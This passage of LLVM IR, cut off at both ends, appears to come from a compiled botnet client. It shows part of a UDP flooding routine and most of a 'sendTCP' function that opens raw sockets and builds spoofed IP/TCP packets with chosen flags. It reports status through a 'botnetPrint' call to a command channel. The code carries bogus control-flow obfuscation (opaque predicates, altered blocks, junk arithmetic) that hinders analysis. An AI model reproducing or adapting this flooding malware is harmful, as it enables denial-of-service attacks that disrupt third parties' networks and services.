  %473 = call i32 @usleep(i32 %472)
  store i32 0, i32* %33, align 4
  br label %362

; <label>:474:                                    ; preds = %originalBBpart282
  %475 = load i32, i32* %33, align 4
  %476 = add i32 %475, 1
  store i32 %476, i32* %33, align 4
  br label %362

; <label>:477:                                    ; preds = %446
  %478 = load i8*, i8** %28, align 8
  call void @llvm.stackrestore(i8* %478)
  br label %479

; <label>:479:                                    ; preds = %477, %247, %239, %218, %120, %94, %67
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %41
  %480 = load i32, i32* %10, align 4
  %481 = trunc i32 %480 to i16
  %482 = call zeroext i16 @htons(i16 zeroext %481) #10
  %483 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %482, i16* %483, align 2
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %68
  %484 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 3
  %485 = getelementptr inbounds [8 x i8], [8 x i8]* %484, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %485, i8 0, i64 8, i32 4, i1 false)
  %486 = load i32, i32* %14, align 4
  store i32 %486, i32* %18, align 4
  %487 = load i32, i32* %12, align 4
  %488 = icmp eq i32 %487, 32
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %97
  %489 = load i32, i32* %13, align 4
  %_ = sub i32 %489, 1
  %gen = mul i32 %_, 1
  %_7 = sub i32 %489, 1
  %gen8 = mul i32 %_7, 1
  %_9 = sub i32 %489, 1
  %gen10 = mul i32 %_9, 1
  %_11 = sub i32 0, %489
  %gen12 = add i32 %_11, 1
  %_13 = sub i32 %489, 1
  %gen14 = mul i32 %_13, 1
  %_15 = shl i32 %489, 1
  %_16 = sub i32 0, %489
  %gen17 = add i32 %_16, 1
  %490 = add nsw i32 %489, 1
  %491 = sext i32 %490 to i64
  %492 = call noalias i8* @malloc(i64 %491) #3
  store i8* %492, i8** %20, align 8
  %493 = load i8*, i8** %20, align 8
  %494 = icmp eq i8* %493, null
  br label %originalBB6

originalBB21alteredBB:                            ; preds = %originalBB21, %121
  %495 = load i8*, i8** %20, align 8
  %496 = load i32, i32* %13, align 4
  %_22 = sub i32 %496, 1
  %gen23 = mul i32 %_22, 1
  %_24 = sub i32 0, %496
  %gen25 = add i32 %_24, 1
  %_26 = sub i32 0, %496
  %gen27 = add i32 %_26, 1
  %_28 = sub i32 %496, 1
  %gen29 = mul i32 %_28, 1
  %497 = add nsw i32 %496, 1
  %498 = sext i32 %497 to i64
  call void @llvm.memset.p0i8.i64(i8* %495, i8 0, i64 %498, i32 1, i1 false)
  %499 = load i8*, i8** %20, align 8
  %500 = load i32, i32* %13, align 4
  call void @makeRandomStr(i8* %499, i32 %500)
  %501 = call i64 @time(i64* null) #3
  %502 = load i32, i32* %11, align 4
  %503 = sext i32 %502 to i64
  %_30 = sub i64 %501, %503
  %gen31 = mul i64 %_30, %503
  %_32 = shl i64 %501, %503
  %_33 = sub i64 %501, %503
  %gen34 = mul i64 %_33, %503
  %_35 = shl i64 %501, %503
  %_36 = shl i64 %501, %503
  %504 = add nsw i64 %501, %503
  %505 = trunc i64 %504 to i32
  store i32 %505, i32* %21, align 4
  store i32 0, i32* %22, align 4
  store i32 0, i32* %23, align 4
  br label %originalBB21

originalBB40alteredBB:                            ; preds = %originalBB40, %171
  br label %originalBB40

originalBB44alteredBB:                            ; preds = %originalBB44, %195
  %506 = load i32, i32* %16, align 4
  %_45 = shl i32 %506, 1000
  %_46 = sub i32 0, %506
  %gen47 = add i32 %_46, 1000
  %507 = mul nsw i32 %506, 1000
  %508 = call i32 @usleep(i32 %507)
  store i32 0, i32* %23, align 4
  br label %originalBB44

originalBB51alteredBB:                            ; preds = %originalBB51, %219
  %509 = call i32 @socket(i32 2, i32 3, i32 17) #3
  store i32 %509, i32* %24, align 4
  %510 = load i32, i32* %24, align 4
  %511 = icmp ne i32 %510, 0
  br label %originalBB51

originalBB55alteredBB:                            ; preds = %originalBB55, %251
  %512 = load i32, i32* %26, align 4
  %_56 = sub i32 0, %512
  %gen57 = add i32 %_56, -1
  %_58 = sub i32 0, %512
  %gen59 = add i32 %_58, -1
  %_60 = sub i32 0, %512
  %gen61 = add i32 %_60, -1
  %_62 = sub i32 %512, -1
  %gen63 = mul i32 %_62, -1
  %_64 = sub i32 %512, -1
  %gen65 = mul i32 %_64, -1
  %513 = add nsw i32 %512, -1
  store i32 %513, i32* %26, align 4
  %514 = icmp ne i32 %512, 0
  br label %originalBB55

originalBB69alteredBB:                            ; preds = %originalBB69, %375
  %515 = call i32 @rand_cmwc()
  br label %originalBB69

originalBB73alteredBB:                            ; preds = %originalBB73, %425
  %516 = call i64 @time(i64* null) #3
  %517 = load i32, i32* %31, align 4
  %518 = sext i32 %517 to i64
  %519 = icmp sgt i64 %516, %518
  br label %originalBB73

originalBB77alteredBB:                            ; preds = %originalBB77, %448
  %520 = load i32, i32* %32, align 4
  %_78 = sub i32 %520, 1
  %gen79 = mul i32 %_78, 1
  %_80 = shl i32 %520, 1
  %521 = add i32 %520, 1
  store i32 %521, i32* %32, align 4
  %522 = load i32, i32* %33, align 4
  %523 = load i32, i32* %15, align 4
  %524 = icmp eq i32 %522, %523
  br label %originalBB77
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #2

declare i32 @usleep(i32) #2

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #6

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %14, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %7
  %31 = call i32 @rand_cmwc()
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  br label %39

; <label>:34:                                     ; preds = %7
  %35 = load i32, i32* %9, align 4
  %36 = trunc i32 %35 to i16
  %37 = call zeroext i16 @htons(i16 zeroext %36) #10
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  br label %39

; <label>:39:                                     ; preds = %34, %30
  %40 = load i8*, i8** %8, align 8
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %42 = call i32 @getHost(i8* %40, %struct.in_addr* %41)
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %39
  br label %582

; <label>:45:                                     ; preds = %39
  %46 = load i32, i32* @x.99
  %47 = load i32, i32* @y.100
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %45
  %54 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %55 = getelementptr inbounds [8 x i8], [8 x i8]* %54, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %55, i8 0, i64 8, i32 4, i1 false)
  %56 = call i32 @socket(i32 2, i32 3, i32 6) #3
  store i32 %56, i32* %17, align 4
  %57 = load i32, i32* %17, align 4
  %58 = icmp ne i32 %57, 0
  %59 = load i32, i32* @x.99
  %60 = load i32, i32* @y.100
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %58, label %70, label %67

; <label>:67:                                     ; preds = %originalBBpart2
  %68 = load i32, i32* @KadenCommStock, align 4
  %69 = call i32 (i32, i8*, ...) @botnetPrint(i32 %68, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.117, i32 0, i32 0))
  br label %582

; <label>:70:                                     ; preds = %originalBBpart2
  %71 = load i32, i32* @x.99
  %72 = load i32, i32* @y.100
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %70
  store i32 1, i32* %18, align 4
  %79 = load i32, i32* %17, align 4
  %80 = bitcast i32* %18 to i8*
  %81 = call i32 @setsockopt(i32 %79, i32 0, i32 3, i8* %80, i32 4) #3
  %82 = icmp slt i32 %81, 0
  %83 = load i32, i32* @x.99
  %84 = load i32, i32* @y.100
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %82, label %91, label %94

; <label>:91:                                     ; preds = %originalBBpart24
  %92 = load i32, i32* @KadenCommStock, align 4
  %93 = call i32 (i32, i8*, ...) @botnetPrint(i32 %92, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.118, i32 0, i32 0))
  br label %582

; <label>:94:                                     ; preds = %originalBBpart24
  %95 = load i32, i32* %11, align 4
  %96 = icmp eq i32 %95, 0
  br i1 %96, label %97, label %98

; <label>:97:                                     ; preds = %94
  store i32 0, i32* %19, align 4
  br label %120

; <label>:98:                                     ; preds = %94
  %99 = load i32, i32* @x.99
  %100 = load i32, i32* @y.100
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %98
  %107 = load i32, i32* %11, align 4
  %108 = sub nsw i32 32, %107
  %109 = shl i32 1, %108
  %110 = sub nsw i32 %109, 1
  %111 = xor i32 %110, -1
  store i32 %111, i32* %19, align 4
  %112 = load i32, i32* @x.99
  %113 = load i32, i32* @y.100
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBBpart249, label %originalBB6alteredBB

originalBBpart249:                                ; preds = %originalBB6
  br label %120

; <label>:120:                                    ; preds = %originalBBpart249, %97
  %121 = load i32, i32* @x.99
  %122 = load i32, i32* @y.100
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBB51, label %originalBB51alteredBB

originalBB51:                                     ; preds = %originalBB51alteredBB, %120
  %129 = load i32, i32* %13, align 4
  %130 = sext i32 %129 to i64
  %131 = add i64 40, %130
  %132 = call i8* @llvm.stacksave()
  store i8* %132, i8** %20, align 8
  %133 = alloca i8, i64 %131, align 16
  %134 = bitcast i8* %133 to %struct.iphdr*
  store %struct.iphdr* %134, %struct.iphdr** %21, align 8
  %135 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %136 = bitcast %struct.iphdr* %135 to i8*
  %137 = getelementptr i8, i8* %136, i64 20
  %138 = bitcast i8* %137 to %struct.tcphdr*
  store %struct.tcphdr* %138, %struct.tcphdr** %22, align 8
  %139 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %140 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %141 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %140, i32 0, i32 0
  %142 = load i32, i32* %141, align 4
  %143 = load i32, i32* %19, align 4
  %144 = call i32 @GRIP(i32 %143)
  %145 = call i32 @htonl(i32 %144) #10
  %146 = load i32, i32* %13, align 4
  %147 = sext i32 %146 to i64
  %148 = add i64 20, %147
  %149 = trunc i64 %148 to i32
  call void @makeIPPacket(%struct.iphdr* %139, i32 %142, i32 %145, i8 zeroext 6, i32 %149)
  %150 = call i32 @rand_cmwc()
  %151 = trunc i32 %150 to i16
  %152 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %153 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %152, i32 0, i32 0
  %154 = bitcast %union.anon* %153 to %struct.anon.0*
  %155 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %154, i32 0, i32 0
  store i16 %151, i16* %155, align 4
  %156 = call i32 @rand_cmwc()
  %157 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %158 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %157, i32 0, i32 0
  %159 = bitcast %union.anon* %158 to %struct.anon.0*
  %160 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %159, i32 0, i32 2
  store i32 %156, i32* %160, align 4
  %161 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %162 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %161, i32 0, i32 0
  %163 = bitcast %union.anon* %162 to %struct.anon.0*
  %164 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %163, i32 0, i32 3
  store i32 0, i32* %164, align 4
  %165 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %166 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %165, i32 0, i32 0
  %167 = bitcast %union.anon* %166 to %struct.anon.0*
  %168 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %167, i32 0, i32 4
  %169 = load i16, i16* %168, align 4
  %170 = and i16 %169, -241
  %171 = or i16 %170, 80
  store i16 %171, i16* %168, align 4
  %172 = load i8*, i8** %12, align 8
  %173 = call i32 @strcmp(i8* %172, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.119, i32 0, i32 0)) #9
  %174 = icmp ne i32 %173, 0
  %175 = load i32, i32* @x.99
  %176 = load i32, i32* @y.100
  %177 = sub i32 %175, 1
  %178 = mul i32 %175, %177
  %179 = urem i32 %178, 2
  %180 = icmp eq i32 %179, 0
  %181 = icmp slt i32 %176, 10
  %182 = or i1 %180, %181
  br i1 %182, label %originalBBpart267, label %originalBB51alteredBB

originalBBpart267:                                ; preds = %originalBB51
  br i1 %174, label %219, label %183

; <label>:183:                                    ; preds = %originalBBpart267
  %184 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %185 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %184, i32 0, i32 0
  %186 = bitcast %union.anon* %185 to %struct.anon.0*
  %187 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %186, i32 0, i32 4
  %188 = load i16, i16* %187, align 4
  %189 = and i16 %188, -513
  %190 = or i16 %189, 512
  store i16 %190, i16* %187, align 4
  %191 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %192 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %191, i32 0, i32 0
  %193 = bitcast %union.anon* %192 to %struct.anon.0*
  %194 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %193, i32 0, i32 4
  %195 = load i16, i16* %194, align 4
  %196 = and i16 %195, -1025
  %197 = or i16 %196, 1024
  store i16 %197, i16* %194, align 4
  %198 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %199 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %198, i32 0, i32 0
  %200 = bitcast %union.anon* %199 to %struct.anon.0*
  %201 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %200, i32 0, i32 4
  %202 = load i16, i16* %201, align 4
  %203 = and i16 %202, -257
  %204 = or i16 %203, 256
  store i16 %204, i16* %201, align 4
  %205 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %206 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %205, i32 0, i32 0
  %207 = bitcast %union.anon* %206 to %struct.anon.0*
  %208 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %207, i32 0, i32 4
  %209 = load i16, i16* %208, align 4
  %210 = and i16 %209, -4097
  %211 = or i16 %210, 4096
  store i16 %211, i16* %208, align 4
  %212 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %213 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %212, i32 0, i32 0
  %214 = bitcast %union.anon* %213 to %struct.anon.0*
  %215 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %214, i32 0, i32 4
  %216 = load i16, i16* %215, align 4
  %217 = and i16 %216, -2049
  %218 = or i16 %217, 2048
  store i16 %218, i16* %215, align 4
  br label %392

; <label>:219:                                    ; preds = %originalBBpart267
  %220 = load i8*, i8** %12, align 8
  %221 = call i8* @strtok(i8* %220, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.120, i32 0, i32 0)) #3
  store i8* %221, i8** %23, align 8
  br label %222

; <label>:222:                                    ; preds = %389, %219
  %223 = load i32, i32* @x.99
  %224 = load i32, i32* @y.100
  %225 = sub i32 %223, 1
  %226 = mul i32 %223, %225
  %227 = urem i32 %226, 2
  %228 = icmp eq i32 %227, 0
  %229 = icmp slt i32 %224, 10
  %230 = or i1 %228, %229
  br i1 %230, label %originalBB69, label %originalBB69alteredBB

originalBB69:                                     ; preds = %originalBB69alteredBB, %222
  %231 = load i8*, i8** %23, align 8
  %232 = icmp ne i8* %231, null
  %233 = load i32, i32* @x.99
  %234 = load i32, i32* @y.100
  %235 = sub i32 %233, 1
  %236 = mul i32 %233, %235
  %237 = urem i32 %236, 2
  %238 = icmp eq i32 %237, 0
  %239 = icmp slt i32 %234, 10
  %240 = or i1 %238, %239
  br i1 %240, label %originalBBpart271, label %originalBB69alteredBB

originalBBpart271:                                ; preds = %originalBB69
  br i1 %232, label %241, label %391

; <label>:241:                                    ; preds = %originalBBpart271
  %242 = load i8*, i8** %23, align 8
  %243 = call i32 @strcmp(i8* %242, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.121, i32 0, i32 0)) #9
  %244 = icmp ne i32 %243, 0
  br i1 %244, label %253, label %245

; <label>:245:                                    ; preds = %241
  %246 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %247 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %246, i32 0, i32 0
  %248 = bitcast %union.anon* %247 to %struct.anon.0*
  %249 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %248, i32 0, i32 4
  %250 = load i16, i16* %249, align 4
  %251 = and i16 %250, -513
  %252 = or i16 %251, 512
  store i16 %252, i16* %249, align 4
  br label %389

; <label>:253:                                    ; preds = %241
  %254 = load i8*, i8** %23, align 8
  %255 = call i32 @strcmp(i8* %254, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.122, i32 0, i32 0)) #9
  %256 = icmp ne i32 %255, 0
  br i1 %256, label %281, label %257

; <label>:257:                                    ; preds = %253
  %258 = load i32, i32* @x.99
  %259 = load i32, i32* @y.100
  %260 = sub i32 %258, 1
  %261 = mul i32 %258, %260
  %262 = urem i32 %261, 2
  %263 = icmp eq i32 %262, 0
  %264 = icmp slt i32 %259, 10
  %265 = or i1 %263, %264
  br i1 %265, label %originalBB73, label %originalBB73alteredBB

originalBB73:                                     ; preds = %originalBB73alteredBB, %257
  %266 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %267 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %266, i32 0, i32 0
  %268 = bitcast %union.anon* %267 to %struct.anon.0*
  %269 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %268, i32 0, i32 4
  %270 = load i16, i16* %269, align 4
  %271 = and i16 %270, -1025
  %272 = or i16 %271, 1024
  store i16 %272, i16* %269, align 4
  %273 = load i32, i32* @x.99
  %274 = load i32, i32* @y.100
  %275 = sub i32 %273, 1
  %276 = mul i32 %273, %275
  %277 = urem i32 %276, 2
  %278 = icmp eq i32 %277, 0
  %279 = icmp slt i32 %274, 10
  %280 = or i1 %278, %279
  br i1 %280, label %originalBBpart291, label %originalBB73alteredBB

originalBBpart291:                                ; preds = %originalBB73
  br label %388

; <label>:281:                                    ; preds = %253
  %282 = load i32, i32* @x.99
  %283 = load i32, i32* @y.100
  %284 = sub i32 %282, 1
  %285 = mul i32 %282, %284
  %286 = urem i32 %285, 2
  %287 = icmp eq i32 %286, 0
  %288 = icmp slt i32 %283, 10
  %289 = or i1 %287, %288
  br i1 %289, label %originalBB93, label %originalBB93alteredBB

originalBB93:                                     ; preds = %originalBB93alteredBB, %281
  %290 = load i8*, i8** %23, align 8
  %291 = call i32 @strcmp(i8* %290, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.123, i32 0, i32 0)) #9
  %292 = icmp ne i32 %291, 0
  %293 = load i32, i32* @x.99
  %294 = load i32, i32* @y.100
  %295 = sub i32 %293, 1
  %296 = mul i32 %293, %295
  %297 = urem i32 %296, 2
  %298 = icmp eq i32 %297, 0
  %299 = icmp slt i32 %294, 10
  %300 = or i1 %298, %299
  br i1 %300, label %originalBBpart295, label %originalBB93alteredBB

originalBBpart295:                                ; preds = %originalBB93
  br i1 %292, label %325, label %301

; <label>:301:                                    ; preds = %originalBBpart295
  %302 = load i32, i32* @x.99
  %303 = load i32, i32* @y.100
  %304 = sub i32 %302, 1
  %305 = mul i32 %302, %304
  %306 = urem i32 %305, 2
  %307 = icmp eq i32 %306, 0
  %308 = icmp slt i32 %303, 10
  %309 = or i1 %307, %308
  br i1 %309, label %originalBB97, label %originalBB97alteredBB

originalBB97:                                     ; preds = %originalBB97alteredBB, %301
  %310 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %311 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %310, i32 0, i32 0
  %312 = bitcast %union.anon* %311 to %struct.anon.0*
  %313 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %312, i32 0, i32 4
  %314 = load i16, i16* %313, align 4
  %315 = and i16 %314, -257
  %316 = or i16 %315, 256
  store i16 %316, i16* %313, align 4
  %317 = load i32, i32* @x.99
  %318 = load i32, i32* @y.100
  %319 = sub i32 %317, 1
  %320 = mul i32 %317, %319
  %321 = urem i32 %320, 2
  %322 = icmp eq i32 %321, 0
  %323 = icmp slt i32 %318, 10
  %324 = or i1 %322, %323
  br i1 %324, label %originalBBpart2118, label %originalBB97alteredBB

originalBBpart2118:                               ; preds = %originalBB97
  br label %387

; <label>:325:                                    ; preds = %originalBBpart295
  %326 = load i8*, i8** %23, align 8
  %327 = call i32 @strcmp(i8* %326, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.124, i32 0, i32 0)) #9
  %328 = icmp ne i32 %327, 0
  br i1 %328, label %337, label %329

; <label>:329:                                    ; preds = %325
  %330 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %331 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %330, i32 0, i32 0
  %332 = bitcast %union.anon* %331 to %struct.anon.0*
  %333 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %332, i32 0, i32 4
  %334 = load i16, i16* %333, align 4
  %335 = and i16 %334, -4097
  %336 = or i16 %335, 4096
  store i16 %336, i16* %333, align 4
  br label %386

; <label>:337:                                    ; preds = %325
  %338 = load i32, i32* @x.99
  %339 = load i32, i32* @y.100
  %340 = sub i32 %338, 1
  %341 = mul i32 %338, %340
  %342 = urem i32 %341, 2
  %343 = icmp eq i32 %342, 0
  %344 = icmp slt i32 %339, 10
  %345 = or i1 %343, %344
  br i1 %345, label %originalBB120, label %originalBB120alteredBB

originalBB120:                                    ; preds = %originalBB120alteredBB, %337
  %346 = load i8*, i8** %23, align 8
  %347 = call i32 @strcmp(i8* %346, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.125, i32 0, i32 0)) #9
  %348 = icmp ne i32 %347, 0
  %349 = load i32, i32* @x.99
  %350 = load i32, i32* @y.100
  %351 = sub i32 %349, 1
  %352 = mul i32 %349, %351
  %353 = urem i32 %352, 2
  %354 = icmp eq i32 %353, 0
  %355 = icmp slt i32 %350, 10
  %356 = or i1 %354, %355
  br i1 %356, label %originalBBpart2122, label %originalBB120alteredBB

originalBBpart2122:                               ; preds = %originalBB120
  br i1 %348, label %365, label %357

; <label>:357:                                    ; preds = %originalBBpart2122
  %358 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %359 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %358, i32 0, i32 0
  %360 = bitcast %union.anon* %359 to %struct.anon.0*
  %361 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %360, i32 0, i32 4
  %362 = load i16, i16* %361, align 4
  %363 = and i16 %362, -2049
  %364 = or i16 %363, 2048
  store i16 %364, i16* %361, align 4
  br label %385

; <label>:365:                                    ; preds = %originalBBpart2122
  %366 = load i32, i32* @x.99
  %367 = load i32, i32* @y.100
  %368 = sub i32 %366, 1
  %369 = mul i32 %366, %368
  %370 = urem i32 %369, 2
  %371 = icmp eq i32 %370, 0
  %372 = icmp slt i32 %367, 10
  %373 = or i1 %371, %372
  br i1 %373, label %originalBB124, label %originalBB124alteredBB

originalBB124:                                    ; preds = %originalBB124alteredBB, %365
  %374 = load i32, i32* @KadenCommStock, align 4
  %375 = load i8*, i8** %23, align 8
  %376 = call i32 (i32, i8*, ...) @botnetPrint(i32 %374, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.126, i32 0, i32 0), i8* %375)
  %377 = load i32, i32* @x.99
  %378 = load i32, i32* @y.100
  %379 = sub i32 %377, 1
  %380 = mul i32 %377, %379
  %381 = urem i32 %380, 2
  %382 = icmp eq i32 %381, 0
  %383 = icmp slt i32 %378, 10
  %384 = or i1 %382, %383
  br i1 %384, label %originalBBpart2126, label %originalBB124alteredBB

originalBBpart2126:                               ; preds = %originalBB124
  br label %385

; <label>:385:                                    ; preds = %originalBBpart2126, %357
  br label %386

; <label>:386:                                    ; preds = %385, %329
  br label %387

; <label>:387:                                    ; preds = %386, %originalBBpart2118
  br label %388

; <label>:388:                                    ; preds = %387, %originalBBpart291
  br label %389

; <label>:389:                                    ; preds = %388, %245
  %390 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.120, i32 0, i32 0)) #3
  store i8* %390, i8** %23, align 8
  br label %222

; <label>:391:                                    ; preds = %originalBBpart271
  br label %392

; <label>:392:                                    ; preds = %391, %183
  %393 = call i32 @rand_cmwc()
  %394 = trunc i32 %393 to i16
  %395 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %396 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %395, i32 0, i32 0
  %397 = bitcast %union.anon* %396 to %struct.anon.0*
  %398 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %397, i32 0, i32 5
  store i16 %394, i16* %398, align 2
  %399 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %400 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %399, i32 0, i32 0
  %401 = bitcast %union.anon* %400 to %struct.anon.0*
  %402 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %401, i32 0, i32 6
  store i16 0, i16* %402, align 4
  %403 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %404 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %403, i32 0, i32 0
  %405 = bitcast %union.anon* %404 to %struct.anon.0*
  %406 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %405, i32 0, i32 7
  store i16 0, i16* %406, align 2
  %407 = load i32, i32* %9, align 4
  %408 = icmp eq i32 %407, 0
  br i1 %408, label %409, label %427

; <label>:409:                                    ; preds = %392
  %410 = load i32, i32* @x.99
  %411 = load i32, i32* @y.100
  %412 = sub i32 %410, 1
  %413 = mul i32 %410, %412
  %414 = urem i32 %413, 2
  %415 = icmp eq i32 %414, 0
  %416 = icmp slt i32 %411, 10
  %417 = or i1 %415, %416
  br i1 %417, label %originalBB128, label %originalBB128alteredBB

originalBB128:                                    ; preds = %originalBB128alteredBB, %409
  %418 = call i32 @rand_cmwc()
  %419 = load i32, i32* @x.99
  %420 = load i32, i32* @y.100
  %421 = sub i32 %419, 1
  %422 = mul i32 %419, %421
  %423 = urem i32 %422, 2
  %424 = icmp eq i32 %423, 0
  %425 = icmp slt i32 %420, 10
  %426 = or i1 %424, %425
